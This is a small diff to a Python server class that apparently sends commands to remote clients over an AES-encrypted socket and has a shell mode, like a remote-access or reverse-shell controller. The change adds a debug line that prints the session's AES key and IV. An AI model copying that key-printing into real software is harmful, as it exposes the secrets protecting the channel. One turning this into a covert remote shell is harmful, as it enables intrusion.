@@ -83,10 +83,11 @@ class Server(object):
             res += connection.conn.recv(header-len(res))
         return connection.aes.decrypt(res)
     
-    
+
     def retriveCommand(self,connection, command):
-        command = self.sendMsg(connection,command)
-        return self.recvMsg(connection)
+        print(f'key is: {connection.aes.key}\niv:{connection.aes.iv}')
+        command = self.sendMsg(connection,command.encode())
+        return self.recvMsg(connection).decode(errors='replace')
         
 
     def _setShellMode(self,conn):
